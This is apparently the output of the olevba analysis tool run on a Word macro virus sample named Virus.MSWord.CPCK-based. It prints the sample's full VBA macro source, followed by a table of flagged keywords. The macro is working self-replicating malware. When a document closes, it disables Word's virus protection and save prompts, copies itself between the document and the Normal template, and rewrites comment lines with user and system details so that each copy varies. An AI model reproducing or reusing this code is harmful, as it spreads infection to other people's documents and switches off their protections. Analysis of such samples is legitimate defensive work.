olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-137b2f9bfa41dc84614a5dbb9252203d184d0ebb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-137b2f9bfa41dc84614a5dbb9252203d184d0ebb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
On Error Resume Next
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
Options.SaveNormalPrompt = 0
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
Application.EnableCancelKey = 0
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
RC24 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
Options.ConfirmConversions = 0
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
Options.VirusProtection = 0
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
CO49 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
If CO49 > 0 And RC24 > 0 Then GoTo JO36
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
If CO49 = 0 Then
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
Set KT74 = ActiveDocument.VBProject.VBComponents.Item(1)
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
IH6 = True
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
End If
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
If RC24 = 0 Then
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
Set KT74 = NormalTemplate.VBProject.VBComponents.Item(1)
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
FV52 = True
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
End If
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
If FV52 <> True And IH6 <> True Then GoTo JO36
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
If FV52 = True Then KT74.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CO49 - 1))
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
If IH6 = True Then KT74.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RC24 - 1))
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
With KT74.CodeModule
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
For x = 2 To (KT74.CodeModule.CountOfLines - 1) Step 2
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
Next x
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
End With
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
JO36:
'TesterT00013327.DOC00013327.DOC2/23/01 5:55:03 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

